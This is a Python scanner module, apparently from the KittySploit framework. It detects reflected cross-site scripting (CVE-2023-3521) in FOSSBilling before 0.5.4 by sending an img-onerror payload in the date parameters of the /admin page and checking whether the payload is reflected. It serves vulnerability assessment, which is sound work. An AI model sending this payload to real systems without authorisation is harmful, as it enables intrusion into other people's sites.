#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Cross-site Scripting (XSS) - Reflected in GitHub repository fossbilling/fossbilling prior to 0."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'FOSSBilling < 0.5.3 - Cross-Site Scripting Detection',
        'description': 'Cross-site Scripting (XSS) - Reflected in GitHub repository fossbilling/fossbilling prior to 0.5.4.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve2023', 'cve', 'fossbilling', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://huntr.com/bounties/76a3441d-7f75-4a8d-a7a0-95a7f5456eb0',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-3521',
        ],
        'cve': 'CVE-2023-3521',
    }

    def run(self):
        path = '/admin?_url=%2Fadmin&date_to=\'"><img+src=x+onerror=alert(3)>&date_from=\'"><img+src=x+onerror=alert(3)>'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('<img src=x onerror=alert(3)>', 'FOSSBilling',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='FOSSBilling < 0.5.3 - Cross-Site Scripting detected', path=path)
            return True
        return False

